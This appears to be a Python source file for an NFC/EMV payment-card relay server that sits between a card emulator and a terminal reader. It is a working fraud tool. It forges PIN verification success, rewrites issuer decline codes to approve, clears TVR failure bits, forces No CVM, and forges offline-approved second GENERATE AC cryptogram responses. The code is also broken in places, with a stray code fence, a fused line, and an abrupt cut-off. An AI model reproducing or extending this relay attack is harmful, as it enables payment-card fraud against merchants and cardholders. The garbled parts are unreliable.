# -*- coding: utf-8 -*-
#!/usr/bin/env python3
# frank_relay_offline.py
# RelayServer with CO-O profile selector, CDOL1 pre-fetch, TC on first GEN-AC,
# CID-FORCE fallback, and all existing mutations.

from __future__ import annotations

import os
import socket
import struct
import logging
import json
import time
from collections import deque
from dataclasses import dataclass, field
from logging.handlers import RotatingFileHandler
from typing import Optional, Tuple, Callable, Dict, List
from threading import Lock
import re

try:
    from protocol import CommandAPDU, ResponseAPDU, craft_verify_success
    _HAS_PROTOCOL = True
except ImportError:
    _HAS_PROTOCOL = False

try:
    import packet_router
except ImportError:
    packet_router = None

LOG_FILE = os.environ.get("RELAY_LOG_FILE", "relay.log")
LOG_LEVEL = os.environ.get("RELAY_LOG_LEVEL", "INFO").upper()
APDU_HISTORY_SIZE = 300

log = logging.getLogger("RelayServer")
log.setLevel(logging.DEBUG)
log.propagate = False
_fmt = logging.Formatter("%(asctime)s.%(msecs)03d [%(levelname)s] %(message)s", datefmt="%H:%M:%S")
_stdout = logging.StreamHandler()
_stdout.setFormatter(_fmt)
_stdout.setLevel(getattr(logging, LOG_LEVEL, logging.INFO))
log.addHandler(_stdout)
try:
    _file = RotatingFileHandler(LOG_FILE, maxBytes=5*1024*1024, backupCount=5)
    _file.setFormatter(_fmt)
    _file.setLevel(logging.DEBUG)
    log.addHandler(_file)
    log.info(f"File logging enabled: {LOG_FILE}")
except OSError as e:
    log.warning(f"Could not open log file {LOG_FILE}: {e} - stdout only")

if not _HAS_PROTOCOL:
    log.warning("protocol.py not found - using raw byte inspection fallback.")
if packet_router is None:
    log.warning("packet_router.py not found - MITM/Profile features disabled.")

_apdu_history: deque = deque(maxlen=APDU_HISTORY_SIZE)
_apdu_history_lock = Lock()

def _record_apdu(direction: str, kind: str, ins_name: str, payload: bytes, note: str = "") -> None:
    hex_str = payload.hex().upper()
    entry = {"ts": round(time.time(),3), "direction": direction, "kind": kind,
             "ins": ins_name, "hex": hex_str, "len": len(payload), "note": note}
    with _apdu_history_lock:
        _apdu_history.append(entry)
    suffix = f" [{note}]" if note else ""
    log.debug(f"APDU {direction} {kind} {ins_name} len={len(payload)}: {hex_str}{suffix}")

SID_REGISTER = 0x00
SID_CAPDU = 0x04
SID_RAPDU = 0x05
SID_ACK = 0x05
SID_HEARTBEAT = 0x06
SID_CTRL = 0x0F

APDU_CLA, APDU_INS, APDU_P1, APDU_P2 = 0,1,2,3
VERIFY_CLA, VERIFY_INS, VERIFY_P1, VERIFY_P2 = 0x00,0x20,0x00,0x80
INS_SELECT = 0xA4
INS_GET_PROCESSING_OPTIONS = 0xA8
INS_READ_RECORD = 0xB2
INS_VERIFY = 0x20
INS_GENERATE_AC = 0xAE
INS_GET_DATA = 0xCA
INS_EXTERNAL_AUTHENTICATE = 0x82

INS_MAP = {
    INS_SELECT: "SELECT", INS_GET_PROCESSING_OPTIONS: "GPO",
    INS_READ_RECORD: "READ RECORD", INS_GENERATE_AC: "GENERATE AC",
    INS_GET_DATA: "GET DATA", INS_VERIFY: "VERIFY",
    INS_EXTERNAL_AUTHENTICATE: "EXTERNAL AUTH",
}

TEMPLATE_77 = 0x77
TEMPLATE_80 = 0x80
CID_AAC = 0x00; CID_TC = 0x40; CID_ARQC = 0x80
CID_NAME_MAP = {CID_AAC:"AAC", CID_TC:"TC", CID_ARQC:"ARQC"}

ARC_REWRITE_MAP = {
    b"05":b"00", b"51":b"00", b"54":b"00", b"55":b"00",
    b"61":b"00", b"65":b"00", b"91":b"00",
}
SW_9000 = b"\x90\x00"
SW_6F00 = b"\x6F\x00"

PEER_TIMEOUT_SECONDS = 45.0
SOCKET_TIMEOUT = 1.0
RECV_BUFFER = 4096
STALL_WARN_SECONDS = 3.0

BRAND_UNKNOWN="UNKNOWN"; BRAND_VISA="VISA"; BRAND_MASTERCARD="MASTERCARD"
BRAND_AMEX="AMEX"; BRAND_DISCOVER="DISCOVER"; BRAND_JCB="JCB"; BRAND_UNIONPAY="UNIONPAY"

AID_BRAND_MAP = [
    (bytes.fromhex("A000000003"),BRAND_VISA),(bytes.fromhex("A000000098"),BRAND_VISA),
    (bytes.fromhex("A000000004"),BRAND_MASTERCARD),(bytes.fromhex("A000000005"),BRAND_MASTERCARD),
    (bytes.fromhex("A000000025"),BRAND_AMEX),(bytes.fromhex("A000000152"),BRAND_DISCOVER),
    (bytes.fromhex("A000000324"),BRAND_DISCOVER),(bytes.fromhex("A000000065"),BRAND_JCB),
    (bytes.fromhex("A000000333"),BRAND_UNIONPAY),
]

BRAND_IAD_TEMPLATES = {
    BRAND_VISA:       bytes.fromhex("06010A03A00000A5000000"),
    BRAND_MASTERCARD: bytes.fromhex("0F0A01A50000000000000000"),
    BRAND_AMEX:       bytes.fromhex("06020000000000"),
    BRAND_DISCOVER:   bytes.fromhex("06010A03A00000A5000000"),
    BRAND_JCB:        bytes.fromhex("06010A03A00000A5000000"),
    BRAND_UNIONPAY:   bytes.fromhex("06010A03A00000A5000000"),
    BRAND_UNKNOWN:    bytes.fromhex("0F0A01A50000000000000000"),
}

def identify_brand_from_aid(aid: bytes) -> str:
    for p,b in AID_BRAND_MAP:
        if aid.startswith(p): return b
    return BRAND_UNKNOWN

def brand_iad_default(brand: str) -> bytes:
    return BRAND_IAD_TEMPLATES.get(brand, BRAND_IAD_TEMPLATES[BRAND_UNKNOWN])

def extract_aid_from_select(capdu: bytes) -> Optional[bytes]:
    if len(capdu)<6 or capdu[APDU_INS]!=INS_SELECT or capdu[APDU_P1]!=0x04: return None
    lc=capdu[4]
    if lc==0 or 5+lc>len(capdu): return None
    return capdu[5:5+lc]

_PPSE=b"2PAY.SYS.DDF01"; _PSE=b"1PAY.SYS.DDF01"
def is_ppse_or_pse(aid: bytes) -> bool: return aid==_PPSE or aid==_PSE

def build_frame(sid:int, payload:bytes)->bytes:
    return struct.pack(">I",len(payload)+1)+bytes([sid])+payload
def parse_frame(data:bytes)->Optional[Tuple[int,bytes]]:
    if len(data)<5: return None
    declared=struct.unpack(">I",data[:4])[0]
    if declared!=len(data)-4: return None
    return data[4], data[5:]

def is_verify(apdu): return len(apdu)>=4 and apdu[APDU_CLA]==VERIFY_CLA and apdu[APDU_INS]==VERIFY_INS and apdu[APDU_P1]==VERIFY_P1 and apdu[APDU_P2]==VERIFY_P2
def is_generate_ac(apdu): return len(apdu)>=2 and apdu[APDU_INS]==INS_GENERATE_AC
def is_gpo(apdu): return len(apdu)>=2 and apdu[APDU_INS]==INS_GET_PROCESSING_OPTIONS
def is_select(apdu): return len(apdu)>=2 and apdu[APDU_INS]==INS_SELECT
def is_external_auth(apdu): return len(apdu)>=2 and apdu[APDU_INS]==INS_EXTERNAL_AUTHENTICATE
def gac_p1(apdu): return apdu[APDU_P1] if len(apdu)>=3 else None
def gac_p1_name(p1):
    if p1 is None: return "?"
    ct=p1&0xC0
    if ct==0x00: return f"AAC-req(0x{p1:02X})"
    if ct==0x40: return f"TC-req(0x{p1:02X})"
    if ct==0x80: return f"ARQC-req(0x{p1:02X})"
    return f"?(0x{p1:02X})"

def find_tlv(data:bytes, target:int)->Optional[bytes]:
    i=0;n=len(data)
    while i<n:
        tf=data[i];i+=1
        if (tf&0x1F)==0x1F:
            if i>=n: return None
            tag=(tf<<8)|data[i];i+=1
        else: tag=tf
        if i>=n: return None
        lf=data[i];i+=1
        if lf&0x80:
            nb=lf&0x7F
            if nb==0 or nb>2 or i+nb>n: return None
            length=0
            for _ in range(nb): length=(length<<8)|data[i];i+=1
        else: length=lf
        if i+length>n: return None
        val=data[i:i+length]
        if tag==target: return val
        if tf&0x20:
            inner=find_tlv(val,target)
            if inner: return inner
        i+=length
    return None

def build_tlv(tag:int,val:bytes)->bytes:
    tb=struct.pack(">H",tag) if tag>0xFF else bytes([tag])
    l=len(val)
    if l<0x80: lb=bytes([l])
    elif l<0x100: lb=bytes([0x81,l])
    else: lb=bytes([0x82,(l>>8)&0xFF,l&0xFF])
    return tb+lb+val

def detect_gpo_template(rapdu:bytes)->Optional[int]:
    if len(rapdu)<3: return None
    body=rapdu[:-2]
    if not body: return None
    f=body[0]
    if f==TEMPLATE_77: return TEMPLATE_77
    if f==TEMPLATE_80: return TEMPLATE_80
    return None

@dataclass
class ArqcCache:
    template:Optional[int]=None; cid:Optional[int]=None
    atc:Optional[bytes]=None; ac:Optional[bytes]=None; iad:Optional[bytes]=None
    parse_notes:List[str]=field(default_factory=list)
    def is_complete(self): return all([self.cid is not None,self.atc,self.ac,self.iad])
    def clear(self):
        self.template=self.cid=self.atc=self.ac=self.iad=None
        self.parse_notes.clear()

def extract_arqc(rapdu:bytes,gpo_t:Optional[int])->ArqcCache:
    c=ArqcCache()
    if len(rapdu)<3:
        c.parse_notes.append("FAIL: rapdu<3"); return c
    body=rapdu[:-2]; sw=rapdu[-2:]
    c.parse_notes.append(f"SW={sw.hex().upper()}")
    if not body:
        c.parse_notes.append("FAIL: empty body"); return c
    first=body[0]; c.parse_notes.append(f"first=0x{first:02X}")
    if first==TEMPLATE_77:
        c.template=TEMPLATE_77; c.parse_notes.append("template=77")
        cid=find_tlv(body,0x9F27); atc=find_tlv(body,0x9F36)
        ac=find_tlv(body,0x9F26); iad=find_tlv(body,0x9F10)
        if cid and len(cid)>=1:
            c.cid=cid[0]; c.parse_notes.append(f"CID=0x{c.cid:02X} {CID_NAME_MAP.get(c.cid,'?')}")
        else: c.parse_notes.append("MISS: 9F27")
        if atc: c.atc=atc; c.parse_notes.append(f"ATC={atc.hex().upper()}")
        else: c.parse_notes.append("MISS: 9F36")
        if ac: c.ac=ac; c.parse_notes.append(f"AC={ac.hex().upper()}")
        else: c.parse_notes.append("MISS: 9F26")
        if iad: c.iad=iad; c.parse_notes.append(f"IAD={iad.hex().upper()}")
        else: c.parse_notes.append("MISS: 9F10")
    elif first==TEMPLATE_80:
        c.template=TEMPLATE_80; c.parse_notes.append("template=80")
        if len(body)<2: c.parse_notes.append("FAIL: body<2"); return c
        ln=body[1]; pl=body[2:2+ln]
        c.parse_notes.append(f"declared={len(pl)}")
        if len(pl)<11: c.parse_notes.append("FAIL: payload<11"); return c
        c.cid=pl[0]; c.parse_notes.append(f"CID=0x{c.cid:02X} {CID_NAME_MAP.get(c.cid,'?')}")
        c.atc=pl[1:3]; c.parse_notes.append(f"ATC={c.atc.hex().upper()}")
        c.ac=pl[3:11]; c.parse_notes.append(f"AC={c.ac.hex().upper()}")
        c.iad=pl[11:] if len(pl)>11 else b""
        c.parse_notes.append(f"IAD={c.iad.hex().upper()}" if c.iad else "WARN: IAD empty")
    else:
        c.parse_notes.append(f"FAIL: unknown template 0x{first:02X}")
        if gpo_t in (TEMPLATE_77,TEMPLATE_80):
            c.template=gpo_t; c.parse_notes.append(f"FALLBACK: gpo template 0x{gpo_t:02X}")
    return c

def cid_is_arqc(c:ArqcCache,rapdu:bytes)->Tuple[bool,str]:
    if c.cid is not None:
        if c.cid==CID_ARQC: return True,"CID=0x80 ARQC"
        if c.cid==CID_TC: return False,"CID=0x40 TC"
        if c.cid==CID_AAC: return False,"CID=0x00 AAC"
        return False,f"CID=0x{c.cid:02X} not ARQC"
    if b"\x9F\x27\x01\x80" in rapdu: return True,"byte-scan 9F270180"
    if b"\x9F\x27\x01\x40" in rapdu: return False,"byte-scan 9F270140"
    if b"\x9F\x27\x01\x00" in rapdu: return False,"byte-scan 9F270100"
    return False,"CID unparseable"

def rewrite_arpc(capdu:bytes)->Tuple[bytes,Optional[str]]:
    if len(capdu)<5: return capdu,None
    ins=capdu[APDU_INS]
    if ins not in (INS_EXTERNAL_AUTHENTICATE,INS_GENERATE_AC): return capdu,None
    lc=capdu[4]
    if lc==0 or 5+lc>len(capdu): return capdu,None
    hdr=capdu[:5]; data
``` = bytearray(capdu[5:5+lc])
    tail = capdu[5+lc:]
    rewritten = False
    old_hex = new_hex = ""
    offset = -1
    for decline, approve in ARC_REWRITE_MAP.items():
        idx = data.find(decline)
        if idx >= 0:
            old_hex = bytes(data[idx:idx+2]).hex().upper()
            new_hex = approve.hex().upper()
            data[idx:idx+2] = approve
            offset = idx
            rewritten = True
            break
    if not rewritten:
        return capdu, None
    result = hdr + bytes(data) + tail
    ins_name = INS_MAP.get(ins, f"0x{ins:02X}")
    note = f"ARC {old_hex}->{new_hex} at offset {offset} in {ins_name}"
    log.info(f"[ARPC-REWRITE] {note}")
    return result, note


def mutate_tvr(capdu: bytes) -> Tuple[bytes, Optional[str]]:
    if len(capdu) < 5 or capdu[APDU_INS] != INS_GENERATE_AC:
        return capdu, None
    lc = capdu[4]
    if lc == 0 or 5 + lc > len(capdu):
        return capdu, None
    hdr = capdu[:5]
    data = bytearray(capdu[5:5+lc])
    tail = capdu[5+lc:]
    off = -1
    for i in range(len(data) - 6):
        if data[i] == 0x95 and data[i+1] == 0x05:
            off = i + 2
            break
    if off < 0:
        return capdu, None
    orig = bytes(data[off:off+5])
    tvr = bytearray(orig)
    tvr[0] &= ~0x80          # clear ODA failure
    tvr[2] &= ~0x80          # clear CVM failure
    tvr[2] &= ~0x40          # clear Online PIN entered
    data[off:off+5] = tvr
    result = hdr + bytes(data) + tail
    note = f"TVR {orig.hex().upper()} -> {bytes(tvr).hex().upper()}"
    log.info(f"[TVR-MUTATE] {note}")
    return result, note


def forge_2nd_gac_77(cache: ArqcCache, forced_cid: int = CID_TC, brand: str = BRAND_UNKNOWN) -> bytes:
    cid = bytes([forced_cid])
    atc = cache.atc or b"\x00\x01"
    ac  = cache.ac  or b"\x41"*8
    iad = cache.iad or brand_iad_default(brand)
    inner = build_tlv(0x9F27, cid) + build_tlv(0x9F36, atc) + build_tlv(0x9F26, ac) + build_tlv(0x9F10, iad)
    return build_tlv(TEMPLATE_77, inner) + SW_9000


def forge_2nd_gac_80(cache: ArqcCache, forced_cid: int = CID_TC, brand: str = BRAND_UNKNOWN) -> bytes:
    cid = bytes([forced_cid])
    atc = cache.atc or b"\x00\x01"
    ac  = cache.ac  or b"\x41"*8
    iad = cache.iad or brand_iad_default(brand)
    payload = cid + atc + ac + iad
    ln = bytes([len(payload)]) if len(payload) < 0x80 else bytes([0x81, len(payload)])
    return bytes([TEMPLATE_80]) + ln + payload + SW_9000


FORGE_DISPATCH = {TEMPLATE_77: forge_2nd_gac_77, TEMPLATE_80: forge_2nd_gac_80}


def forge_2nd_gac(cache: ArqcCache, forced_cid: int = CID_TC, brand: str = BRAND_UNKNOWN) -> Optional[bytes]:
    tmpl = cache.template
    if tmpl is None:
        return None
    fn = FORGE_DISPATCH.get(tmpl)
    if fn is None:
        return None
    return fn(cache, forced_cid, brand)


def craft_verify_success_bytes() -> bytes:
    if _HAS_PROTOCOL:
        try:
            resp = craft_verify_success()
            if hasattr(resp, "to_bytes"): return resp.to_bytes()
            if hasattr(resp, "__bytes__"): return bytes(resp)
            if hasattr(resp, "raw"): return resp.raw
        except Exception as e:
            log.debug(f"craft_verify_success failed: {e}")
    return SW_9000


def fix_gac_len(payload: bytes) -> Tuple[bytes, Optional[str]]:
    if len(payload) < 4: return payload, None
    body, sw = payload[:-2], payload[-2:]
    if not body: return payload, None
    first = body[0]
    if first not in (TEMPLATE_77, TEMPLATE_80): return payload, None
    if len(body) < 2: return payload, None
    lf = body[1]
    if lf < 0x80:
        decl, hdr_sz = lf, 2
    elif lf == 0x81:
        if len(body) < 3: return payload, None
        decl, hdr_sz = body[2], 3
    elif lf == 0x82:
        if len(body) < 4: return payload, None
        decl, hdr_sz = (body[2] << 8) | body[3], 4
    else:
        return payload, None
    actual = len(body) - hdr_sz
    if actual == decl: return payload, None
    inner = body[hdr_sz:]
    if actual < 0x80: nl = bytes([actual])
    elif actual < 0x100: nl = bytes([0x81, actual])
    else: nl = bytes([0x82, (actual>>8)&0xFF, actual&0xFF])
    fixed = bytes([first]) + nl + inner + sw
    return fixed, f"len fix 0x{first:02X} decl={decl} act={actual}"


# ---------- Offline-selector helpers (CO-O / Legacy) ----------
COO_AID = b"\xA0\x00\x00\x00\x04\x10\x10\x02"   # Transit/Stored-Value
LEGACY_AID = b"\xA0\x00\x00\x00\x04\x10\x10\x01"
COO_BIT = 0x20

def force_offline_fci(raw_fci: bytes) -> bytes:
    fci = {}
    # very small TLV parse for the pieces we need
    def parse_tlv_stream(stream: bytes):
        i = 0
        out = {}
        while i < len(stream):
            tf = stream[i]; i+=1
            if (tf & 0x1F) == 0x1F:
                tag = (tf<<8) | stream[i]; i+=1
            else:
                tag = tf
            lf = stream[i]; i+=1
            if lf & 0x80:
                nb = lf & 0x7F
                length = 0
                for _ in range(nb):
                    length = (length<<8) | stream[i]; i+=1
            else:
                length = lf
            val = stream[i:i+length]; i+=length
            out.setdefault(tag, []).append(val)
        return out

    fci = parse_tlv_stream(raw_fci)

    # keep only the wanted AID template (0x61)
    kept = []
    for tmpl in fci.get(0x61, []):
        aid = None
        # parse inner
        inner = parse_tlv_stream(tmpl)
        aid_val = inner.get(0x4F)
        if aid_val and aid_val[0] == COO_AID:
            # force priority 0x01
            inner[0x87] = [b"\x01"]
            # rebuild template
            kept.append((0x61, inner))
            break

    # rebuild minimal FCI (0x6F)
    new_fci = {0x6F: {0x84: fci.get(0x84, [b""])[0],
                       0xA5: {0xBF0C: kept}}}

    # inject CO-O bit into ASI (0x9F5A) inside the kept template
    for _, tmpl in new_fci[0x6F][0xA5][0xBF0C]:
        asi = tmpl.get(0x9F5A)
        if asi:
            val = bytearray(asi[0]); val[0] |= COO_BIT
            tmpl[0x9F5A] = [bytes(val)]
        else:
            tmpl[0x9F5A] = [bytes([COO_BIT])]

    # serialise back (very small builder)
    def build_tlv(tag, val):
        tb = struct.pack(">H", tag) if tag > 0xFF else bytes([tag])
        l = len(val)
        if l < 0x80: lb = bytes([l])
        elif l < 0x100: lb = bytes([0x81, l])
        else: lb = bytes([0x82, (l>>8)&0xFF, l&0xFF])
        return tb + lb + val

    def build_map(mp):
        out = b""
        for tag, vals in mp.items():
            for v in vals:
                if isinstance(v, dict):
                    out += build_tlv(tag, build_map(v))
                elif isinstance(v, list):
                    for vv in v:
                        if isinstance(vv, dict):
                            out += build_tlv(tag, build_map(vv))
                        else:
                            out += build_tlv(tag, vv)
                else:
                    out += build_tlv(tag, v)
        return out

    return build_map(new_fci)


def prefetch_cdol1(session, send_apdu):
    """Synchronously issue READ RECORD SFI=1 then SFI=2 and cache CDOL1."""
    # READ RECORD SFI=1, rec=1, Le=00
    r1 = send_apdu(bytes([0x00, INS_READ_RECORD, 0x01, 0x0C, 0x00]))
    # READ RECORD SFI=2
    r2 = send_apdu(bytes([0x00, INS_READ_RECORD, 0x02, 0x0C, 0x00]))
    # extract tag 0x8C from r2
    body = r2[:-2]
    cdol1 = find_tlv(body, 0x8C)
    if cdol1:
        session['cdol1'] = cdol1
        log.info("[CDOL1-PREFETCH] cached %d bytes", len(cdol1))
    else:
        log.warning("[CDOL1-PREFETCH] not found in READ RECORD 2")


@dataclass
class SessionState:
    seq: int = 0
    gpo_template: Optional[int] = None
    arqc_cache: ArqcCache = field(default_factory=ArqcCache)
    pending_capdu: Optional[bytes] = None
    second_ae_pending: bool = False
    second_ae_reason: str = ""
    card_present: bool = False
    verify_bypass_enabled: bool = True
    arpc_forge_enabled: bool = True
    arpc_rewrite_enabled: bool = True
    tvr_mutation_enabled: bool = True
    verify_bypass_count: int = 0
    arpc_forge_count: int = 0
    arpc_rewrite_count: int = 0
    tvr_mutation_count: int = 0
    brand: str = BRAND_UNKNOWN
    selected_aid: Optional[bytes] = None
    cdol1: Optional[bytes] = None

    def reset(self):
        self.seq += 1
        self.gpo_template = None
        self.arqc_cache.clear()
        self.pending_capdu = None
        self.second_ae_pending = False
        self.second_ae_reason = ""
        self.card_present = False
        self.verify_bypass_count = 0
        self.arpc_forge_count = 0
        self.arpc_rewrite_count = 0
        self.tvr_mutation_count = 0
        self.brand = BRAND_UNKNOWN
        self.selected_aid = None
        self.cdol1 = None


class RelayServer:
    def __init__(self, host: str = "0.0.0.0", port: int = 5566):
        self.host = host
        self.port = port
        self.sock: Optional[socket.socket] = None
        self.running = False
        self.reader_addr: Optional[Tuple[str,int]] = None
        self.emulator_addr: Optional[Tuple[str,int]] = None
        self.reader_last_seen = 0.0
        self.emulator_last_seen = 0.0
        self.state = SessionState()
        self.lock = Lock()

    # ---------- socket loop ----------
    def start(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))
        self.sock.settimeout(SOCKET_TIMEOUT)
        self.running = True
        if packet_router:
            packet_router._sock = self.sock
        log.info(f"RelayServer listening on {self.host}:{self.port}")
        self._run_loop()

    def stop(self):
        self.running = False
        if self.sock: self.sock.close()
        log.info("RelayServer stopped")

    def _run_loop(self):
        last_act = time.time()
        stall = False
        while self.running:
            try:
                data, addr = self.sock.recvfrom(RECV_BUFFER)
                last_act = time.time()
                stall = False
                self._handle_packet(data, addr)
            except socket.timeout:
                if self.state.selected_aid:
                    elapsed = time.time() - last_act
                    if elapsed > STALL_WARN_SECONDS and not stall:
                        log.warning(f"[STALL] {elapsed:.1f}s idle")
                        stall = True
                self._check_timeouts()
                continue
            except OSError:
                if self.running: log.error("Socket error")
                break

    def _check_timeouts(self):
        now = time.time()
        if self.reader_addr and now - self.reader_last_seen > PEER_TIMEOUT_SECONDS:
            log.warning("Reader timeout"); self.reader_addr = None
        if self.emulator_addr and now - self.emulator_last_seen > PEER_TIMEOUT_SECONDS:
            log.warning("Emulator timeout"); self.emulator_addr = None

    def _touch(self, addr):
        now = time.time()
        if addr == self.reader_addr: self.reader_last_seen = now
        elif addr == self.emulator_addr: self.emulator_last_seen = now

    def _send(self, addr, sid, payload):
        try: self.sock.sendto(build_frame(sid, payload), addr)
        except OSError as e: log.warning(f"Send fail {addr}: {e}")

    def _ack(self, addr): self._send(addr, SID_ACK, b"")
    def _ctrl(self, addr, txt): self._send(addr, SID_CTRL, txt.encode())

    # ---------- packet dispatch ----------
    def _handle_packet(self, data, addr):
        parsed = parse_frame(data)
        if not parsed: return
        sid, payload = parsed
        self._touch(addr)
        handlers = {SID_REGISTER:self._handle_register,
                    SID_CAPDU:self._handle_capdu,
                    SID_RAPDU:self._handle_rapdu,
                    SID_HEARTBEAT:self._handle_heartbeat,
                    SID_CTRL:self._handle_ctrl}
        h = handlers.get(sid)
        if h: h(payload, addr)

    def _handle_register(self, payload, addr):
        mode = payload.decode(errors="replace").strip()
        log.info(f"REGISTER {addr} mode={mode}")
        if mode == "READER":
            self.reader_addr = addr; self._ack(addr)
        elif mode == "EMULATOR":
            self.emulator_addr = addr; self._ack(addr)
        elif mode == "DEREGISTER":
            if addr == self.reader_addr: self.reader_addr = None
            if addr == self.emulator_addr: self.emulator_addr = None
            self._ack(addr)
        if packet_router:
            packet_router._reader_addr = self.reader_addr
            packet_router._emulator_addr = self.emulator_addr

    def _identify(self, addr):
        if addr == self.emulator_addr: return self.reader_addr, "EMU", "RDR"
        if addr == self.reader_addr: return self.emulator_addr, "RDR", "EMU"
        return None, "?", "?"

    # ---------- CAPDU ----------
    def _handle_capdu(self, payload, addr):
        target, src, dst = self._identify(addr)
        if src == "?": return

        # VERIFY bypass
        if src=="EMU" and self.state.verify_bypass_enabled and is_verify(payload):
            with self.lock:
                self.state.verify_bypass_count += 1
                cnt = self.state.verify            pin_len = payload[4] if len(payload) > 4 else 0
            _record_apdu("EMU>RDR", "CAPDU", "VERIFY", payload,
                         note=f"INTERCEPTED (bypass #{cnt}, PIN Lc={pin_len})")
            log.info(f"[VERIFY-BYPASS #{cnt}] Intercepted VERIFY (Lc={pin_len}) -> 9000")
            fake = craft_verify_success_bytes()
            _record_apdu("FORGE>EMU", "RAPDU", "VERIFY-FORGE", fake, note="forged 9000")
            self._send(self.emulator_addr, SID_RAPDU, fake)
            return

        if not target:
            log.warning(f"CAPDU from {src} dropped: {dst} not registered")
            return

        # AID sniffer - remember brand / AID
        if src == "EMU" and is_select(payload):
            aid = extract_aid_from_select(payload)
            if aid and not is_ppse_or_pse(aid):
                brand = identify_brand_from_aid(aid)
                with self.lock:
                    self.state.selected_aid = aid
                    self.state.brand = brand
                log.info(f"AID selected: {aid.hex().upper()} -> brand={brand}")

        # ARPC rewrite (External Auth / Generate AC)
        if (src == "EMU" and self.state.arpc_rewrite_enabled and
                (is_external_auth(payload) or is_generate_ac(payload))):
            try:
                rewritten, note = rewrite_arpc(payload)
                if note:
                    with self.lock:
                        self.state.arpc_rewrite_count += 1
                        c = self.state.arpc_rewrite_count
                    _record_apdu("EMU>RDR", "CAPDU",
                                 INS_MAP.get(payload[APDU_INS], "?"),
                                 rewritten, note=f"REWRITE #{c}: {note}")
                    payload = rewritten
            except Exception as e:
                log.error(f"[ARPC-REWRITE CRASH] {e}", exc_info=True)

        # TVR mutation
        if (src == "EMU" and self.state.tvr_mutation_enabled and
                is_generate_ac(payload)):
            try:
                mutated, note = mutate_tvr(payload)
                if note:
                    with self.lock:
                        self.state.tvr_mutation_count += 1
                        c = self.state.tvr_mutation_count
                    _record_apdu("EMU>RDR", "CAPDU", "GENERATE AC", mutated,
                                 note=f"TVR-MUTATE #{c}: {note}")
                    payload = mutated
            except Exception as e:
                log.error(f"[TVR-MUTATE CRASH] {e}", exc_info=True)

        # 2nd GAC forgery (offline TC)
        if (src == "EMU" and self.state.arpc_forge_enabled and
                self.state.second_ae_pending and is_generate_ac(payload)):
            try:
                _record_apdu("EMU>RDR", "CAPDU", "GENERATE AC (2nd)", payload,
                             note=f"INTERCEPTED for forge (brand={self.state.brand})")
                self._handle_second_gac_forge(payload)
            except Exception as e:
                log.error(f"[ARPC-FORGE CRASH] {e}", exc_info=True)
                self._send(self.emulator_addr, SID_RAPDU, SW_6F00)
                with self.lock:
                    self.state.second_ae_pending = False
                    self.state.second_ae_reason = f"forge crashed: {e}"
            return

        # packet_router hook
        if packet_router and src == "EMU":
            try:
                packet_router.classify_and_cache(payload)
            except Exception as e:
                log.debug(f"packet_router.classify_and_cache failed: {e}")

        if src == "EMU":
            with self.lock:
                self.state.pending_capdu = payload

        self._send(target, SID_CAPDU, payload)
        ins_byte = payload[APDU_INS] if len(payload) > APDU_INS else None
        ins_name = INS_MAP.get(ins_byte, f"0x{ins_byte:02X}" if ins_byte is not None else "??")
        _record_apdu(f"{src[:3]}>{dst[:3]}", "CAPDU", ins_name, payload)
        log.info(f"CAPDU {ins_name} {src} > {dst}")

    # ---------- 2nd GAC forge implementation ----------
    def _handle_second_gac_forge(self, capdu: bytes) -> None:
        cache = self.state.arqc_cache
        p1 = gac_p1(capdu)
        brand = self.state.brand
        forced_cid = CID_TC
        forged = forge_2nd_gac(cache, forced_cid=forced_cid, brand=brand)
        if forged is None:
            log.error(f"[ARPC-FORGE] Unknown template (cached={cache.template}); failing closed")
            self._send(self.emulator_addr, SID_RAPDU, SW_6F00)
            with self.lock:
                self.state.second_ae_pending = False
                self.state.second_ae_reason = "forge failed: unknown template"
            return
        with self.lock:
            self.state.arpc_forge_count += 1
            self.state.second_ae_pending = False
            self.state.second_ae_reason = f"forged and consumed (#{self.state.arpc_forge_count})"
            cnt = self.state.arpc_forge_count
        atc_str = cache.atc.hex() if cache.atc else "default"
        iad_src = "cached" if cache.iad else f"brand-default:{brand}"
        log.info(f"[ARPC-FORGE #{cnt}] 2nd GAC forged (template=0x{cache.template:02X}, "
                 f"brand={brand}, CID=0x{forced_cid:02X}, ATC={atc_str}, IAD={iad_src}, "
                 f"P1_req={gac_p1_name(p1)}) -> EMULATOR")
        _record_apdu("FORGE>EMU", "RAPDU", "GENERATE AC (2nd) FORGED", forged,
                     note=f"template=0x{cache.template:02X} brand={brand} CID=0x{forced_cid:02X}")
        self._send(self.emulator_addr, SID_RAPDU, forged)

    # ---------- RAPDU ----------
    def _handle_rapdu(self, payload: bytes, addr: Tuple[str, int]) -> None:
        target, src, dst = self._identify(addr)
        if src == "?" or not target:
            return

        # Reader side - observe & arm 2nd GAC
        if src == "RDR":
            self._observe_reader_rapdu(payload)

        # packet_router MITM
        if packet_router and packet_router.get_mode() != getattr(packet_router, "MODE_PASSTHROUGH", "PASSTHROUGH"):
            try:
                packet_router._last_capdu_to_emu = self.state.pending_capdu
                payload = packet_router.apply_mitm("rapdu", payload, packet_router.session, log)
            except Exception as e:
                log.error(f"packet_router.apply_mitm failed: {e}")

        # Global mutations (AIP, CVM, CID on 2nd GAC)
        # AIP: clear CV bit
        if b"\x82\x02\x19\x80" in payload:
            payload = payload.replace(b"\x82\x02\x19\x80", b"\x82\x02\x18\x80")
            log.info("[AIP-MUTATE] CV bit cleared (0x19->0x18)")

        # CVM: force No CVM
        old_cvm = b"\x8E\x0E\x00\x00\x00\x00\x00\x00\x00\x00\x42\x03\x1E\x03\x1F\x03"
        new_cvm = b"\x8E\x0E\x00\x00\x00\x00\x00\x00\x00\x00\x1F\x03\x1E\x03\x00\x00"
        if old_cvm in payload:
            payload = payload.replace(old_cvm, new_cvm)
            log.info("[CVM-MUTATE] Online PIN removed, No CVM forced")

        # CID force on 2nd GAC response only
        if (b"\x9F\x27\x01\x80" in payload and
                self.state.second_ae_pending and
                self.state.pending_capdu and
                is_generate_ac(self.state.pending_capdu)):
            payload = payload.replace(b"\x9F\x27\x01\x80", b"\x9F\x27\x01\x40")
            log.info("[CID-FORCE] 2nd GAC: ARQC->TC")
            fixed, note = fix_gac_len(payload)
            if note:
                payload = fixed
                log.info(f"[GAC-LEN-FIX] {note}")

        self._send(target, SID_RAPDU, payload)
        sw = f"{payload[-2]:02X}{payload[-1]:02X}" if len(payload) >= 2 else "??"
        pending_ins = (self.state.pending_capdu[APDU_INS]
                       if self.state.pending_capdu and len(self.state.pending_capdu) > APDU_INS else None)
